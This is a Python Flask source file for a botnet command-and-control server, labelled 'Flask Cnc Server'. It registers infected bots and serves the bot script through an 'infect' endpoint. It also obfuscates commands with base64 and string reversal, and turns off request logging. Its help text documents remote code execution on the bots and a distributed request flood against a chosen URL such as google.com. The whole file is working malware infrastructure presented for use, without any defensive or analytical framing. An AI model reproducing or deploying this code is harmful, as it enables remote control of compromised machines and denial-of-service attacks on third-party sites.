import subprocess
import flask
from flask import request, jsonify
from os import system, name
import logging
import base64
import time

host = "0.0.0.0"
port = 80


def clear():
  # for windows
  if name == "nt":
    _ = system("cls")
  # for mac and linux(here, os.name is 'posix')
  else:
    _ = system("clear")


def datetime():
  part1 = str(time.localtime()).replace("time.struct_time(", "")
  part2 = part1.replace(")", "")
  part3 = part2.replace(",", "")
  part4 = part3.replace(" ", ":")
  (
    raw_year,
    raw_month,
    raw_day,
    raw_hour,
    raw_minute,
    raw_seconds,
    empty1,
    empty2,
    empty3,
  ) = part4.split(":")
  year = raw_year.replace("tm_year=", "")
  month = raw_month.replace("tm_mon=", "")
  day = raw_day.replace("tm_mday=", "")
  hour = raw_hour.replace("tm_hour=", "")
  minute = raw_minute.replace("tm_min=", "")
  seconds = raw_seconds.replace("tm_sec=", "")
  return f"[{month}/{day}/{year}][{hour}:{minute}:{seconds}]"


def b64_encode(input):
  input_ascii = input.encode("ascii")
  input_b64_raw = base64.b64encode(input_ascii)
  input_b64 = input_b64_raw.decode("ascii")
  return input_b64


def b64_decode(string):
  string_ascii = string.encode("ascii")
  string_decoded_raw = base64.b64decode(string_ascii)
  string_decoded = string_decoded_raw.decode("ascii")
  return string_decoded


def reverse(input):
  return input[::-1]


def encode(string):
  step1 = b64_encode(string)
  step2 = reverse(step1)
  output = b64_encode(step2)
  return output


def decode(string):
  step4 = b64_decode(string)
  step5 = reverse(step4)
  output = b64_decode(step5)
  return output


def clearcommand():
  with open("command.txt", "r+") as file:
    file.truncate(0)


def getcommand():
  with open("command.txt", "r+") as commandfile:
    command = commandfile.read()
    return command


def setcommand(command):
  with open("command.txt", "r+") as commandfile:
    commandfile.truncate(0)
    commandfile.writelines(encode(command))
    commandfile.close()
    return command


def bottoggle():
  global x
  x = not x
  if x == True:
    with open("bottoggle.txt", "r+") as bottogglefile:
      bottogglefile.truncate(0)
      bottogglefile.writelines(encode(str("listen")))
      bottogglefile.close()
      print("cnc > bots set to Listen")
      return "listen"
  else:
    with open("bottoggle.txt", "r+") as bottogglefile:
      bottogglefile.truncate(0)
      bottogglefile.writelines(encode(str("off")))
      bottogglefile.close()
      print("cnc > bots set to Off")
      return "off"


with open("bottoggle.txt", "r+") as bottogglefile:
  bottogglefile.truncate(0)
  bottogglefile.writelines(encode(str("off")))
  bottogglefile.close()

app = flask.Flask(__name__)

x = True
bots = 0


@app.route("/", methods=["GET"])
def api_home():
  with open('panel.html', 'r') as f:
    html = f.read()
  return html


@app.route("/check", methods=["GET"])
def api_check():
  with open("bottoggle.txt", "r+") as bottogglefile:
    istoggled = bottogglefile.read()
    return istoggled


@app.route("/bot", methods=["GET"])
def api_bot():
  if "check" in request.args:
    with open("bottoggle.txt", "r+") as bottogglefile:
      istoggled = bottogglefile.read()
      return istoggled
  elif "toggle" in request.args:
    return bottoggle()
  elif "connect" in request.args:
    print(f"cnc > bot connected! > {request.args['connect']}")
    return "connected"
  elif "infect" in request.args:
    with open("bot.py") as f:
      contents = f.read()
      return contents

  else:
    command = getcommand()
    return command


@app.route("/cnc", methods=["GET"])
def api_cnc():
  if "command" in request.args:
    command = request.args["command"]
    setcommand(command)
    print(f"cnc > Set CncCommand > {command} > {encode(command)}")
    return f"Set CncCommand : {command} > {encode(command)}\n"
  elif "help" in request.args:
    return """
  ├── Spaces = %%
  ├── Remote Code Executon
  │   └── /cnc?command=*rce*uname%%-a\n
  ├── Distributed Request flood
  │   └── /cnc?command=*req*https://google.com::100::10
  ├── Print Message
  │   └── /cnc?command=*print*Hello%%World\n"""
  else:
    return "404"


@app.route("/help", methods=["GET"])
def api_help():
  return """
  ├── /help
  ├── /cnc
  │   └── /cnc?help
  ├── /bot
  │   └── /bot?help\n"""


def banner():
  return f"""
  Flask Cnc Server
  ├── Started at {datetime()}
  ├── Host  : {host}
  └── Port  : {port}\n"""


log = logging.getLogger("werkzeug")
log.disabled = True
clear()
print(banner())

# app.run(host=host, port=port, debug=True)
app.run(host=host, port=port, debug=True)
